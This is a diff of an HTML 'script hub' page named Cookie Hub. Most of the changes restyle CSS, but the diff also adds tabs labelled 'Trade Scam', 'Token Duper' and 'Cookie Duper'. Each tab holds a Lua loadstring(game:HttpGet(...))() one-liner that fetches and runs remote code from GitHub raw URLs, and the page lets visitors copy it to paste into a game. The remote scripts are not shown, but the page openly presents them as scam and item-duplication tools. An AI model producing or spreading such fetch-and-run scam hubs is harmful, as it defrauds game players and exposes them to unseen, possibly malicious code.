@@ -3,46 +3,47 @@
 <head>
 <meta charset="UTF-8">
 <title>Cookie Hub 🍪</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <style>
 * { box-sizing: border-box; }
 
 body {
   margin: 0;
-  font-family: Arial, sans-serif;
+  font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
   color: #fff;
-  background: radial-gradient(circle at top, #1b0040, #000);
+  background: radial-gradient(circle at top, #3a0a6a, #000010);
   overflow: hidden;
 }
 
-/* 🌌 Galaxy Animation */
+/* galaxy stars */
 body::before {
   content: "";
   position: fixed;
-  width: 200%;
-  height: 200%;
+  inset: -100%;
   background:
-    radial-gradient(1px 1px at 20% 30%, white, transparent),
-    radial-gradient(1px 1px at 80% 40%, white, transparent),
-    radial-gradient(1px 1px at 50% 70%, white, transparent),
-    radial-gradient(1px 1px at 30% 80%, white, transparent),
-    radial-gradient(1px 1px at 70% 20%, white, transparent);
-  animation: stars 60s linear infinite;
-  opacity: 0.6;
+    radial-gradient(1px 1px at 10% 20%, #fff, transparent),
+    radial-gradient(1px 1px at 30% 80%, #fff, transparent),
+    radial-gradient(1px 1px at 70% 40%, #fff, transparent),
+    radial-gradient(1px 1px at 90% 60%, #fff, transparent),
+    radial-gradient(1px 1px at 50% 50%, #fff, transparent);
+  animation: stars 90s linear infinite;
+  opacity: 0.5;
 }
 
 @keyframes stars {
   from { transform: translateY(0); }
-  to { transform: translateY(-500px); }
+  to { transform: translateY(-600px); }
 }
 
 .container {
   width: 420px;
+  max-width: 92%;
   margin: 40px auto;
   background: rgba(15,15,25,0.95);
-  border-radius: 16px;
+  border-radius: 18px;
   padding: 20px;
-  box-shadow: 0 0 40px rgba(120,0,255,0.4);
+  box-shadow: 0 0 40px rgba(160,80,255,0.4);
   position: relative;
   z-index: 1;
 }
@@ -56,91 +57,80 @@ body::before {
   color: #c77dff;
 }
 
+.header p {
+  margin: 6px 0 10px;
+  opacity: 0.85;
+}
+
 .stats {
   text-align: center;
-  margin: 10px 0;
-  color: #bbb;
+  font-size: 14px;
+  opacity: 0.9;
 }
 
 .tabs {
   display: flex;
   gap: 8px;
-  margin-top: 15px;
+  margin: 18px 0;
 }
 
 .tab {
   flex: 1;
+  background: #1f1f2f;
+  border-radius: 12px;
   padding: 10px;
   text-align: center;
-  background: rgba(255,255,255,0.05);
-  border-radius: 10px;
   cursor: pointer;
-  transition: 0.3s;
+  font-size: 13px;
 }
 
 .tab.active {
-  background: linear-gradient(135deg, #7b2cff, #b517ff);
+  background: linear-gradient(135deg, #9b5cff, #c77dff);
 }
 
 .script-box {
-  margin-top: 15px;
-  background: #0c0c18;
-  border-radius: 12px;
-  padding: 12px;
-  font-size: 12px;
-  height: 160px;
-  overflow: auto;
-  white-space: pre-wrap;
+  background: #0f0f18;
+  border-radius: 14px;
+  padding: 14px;
+  font-family: monospace;
+  font-size: 13px;
+  word-break: break-all;
+  min-height: 90px;
 }
 
 .copy-btn {
-  margin-top: 12px;
+  margin-top: 16px;
   width: 100%;
-  padding: 10px;
+  padding: 14px;
+  border-radius: 14px;
   border: none;
-  border-radius: 10px;
-  background: linear-gradient(135deg, #7b2cff, #b517ff);
-  font-weight: bold;
-  color: white;
+  background: linear-gradient(135deg, #9b5cff, #c77dff);
+  color: #fff;
+  font-size: 16px;
   cursor: pointer;
-}
-
-.popup {
-  display: none;
-  position: fixed;
-  bottom: 20px;
-  left: 50%;
-  transform: translateX(-50%);
-  background: #7b2cff;
-  padding: 10px 18px;
-  border-radius: 10px;
-  font-weight: bold;
-  z-index: 10;
 }
 
 .footer {
   text-align: center;
-  margin-top: 10px;
-  font-size: 11px;
-  color: #666;
+  margin-top: 14px;
+  font-size: 12px;
+  opacity: 0.6;
 }
 </style>
 </head>
 
 <body>
-
 <div class="container">
   <div class="header">
     <h1>🍪 Cookie Hub</h1>
     <p>Premium Script Hub</p>
+    <div class="stats">👥 Active Users: <b>189</b></div>
   </div>
 
-  <div class="stats">👥 Active Users: <b>189</b></div>
-
   <div class="tabs">
-    <div class="tab active" onclick="switchTab(0)">Script 1</div>
-    <div class="tab" onclick="switchTab(1)">Script 2</div>
-    <div class="tab" onclick="switchTab(2)">Script 3</div>
+    <div class="tab active" onclick="selectScript(0)">Trade Scam</div>
+    <div class="tab" onclick="selectScript(1)">Token Duper</div>
+    <div class="tab" onclick="selectScript(2)">Cookie Duper</div>
   </div>
 
   <div class="script-box" id="scriptBox"></div>
@@ -150,40 +140,31 @@ body::before {
   <div class="footer">© Cookie Hub</div>
 </div>
 
-<div class="popup" id="popup">✅ Script Copied</div>
-
 <script>
 const scripts = [
-`loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/TradescamV1/refs/heads/main/cookiescripts.lua"))()
+`loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/TradescamV1/refs/heads/main/cookiescripts.lua"))()`,
 
--- your original script 1 continues here`,
+`loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/Tokenduper/refs/heads/main/Cookiescripts.lua"))()`,
 
-`-- your original script 2
-loadstring(game:HttpGet("PASTE_YOUR_SECOND_SCRIPT_URL"))()`,
-
-`-- your original script 3
-loadstring(game:HttpGet("PASTE_YOUR_THIRD_SCRIPT_URL"))()`
+`loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/Cookiescriptsduper/refs/heads/main/cookiescripts.lua"))()`
 ];
 
-let currentTab = 0;
+let current = 0;
 const box = document.getElementById("scriptBox");
 box.textContent = scripts[0];
 
-function switchTab(i) {
-  currentTab = i;
-  document.querySelectorAll(".tab").forEach((t,idx)=>{
-    t.classList.toggle("active", idx === i);
-  });
+function selectScript(i) {
+  current = i;
   box.textContent = scripts[i];
+  document.querySelectorAll(".tab").forEach((t, idx) =>
+    t.classList.toggle("active", idx === i)
+  );
 }
 
 function copyScript() {
-  navigator.clipboard.writeText(scripts[currentTab]);
-  const p = document.getElementById("popup");
-  p.style.display = "block";
-  setTimeout(()=>p.style.display="none",1500);
+  navigator.clipboard.writeText(scripts[current]);
+  alert("Script copied!");
 }
 </script>
-
 </body>
 </html>
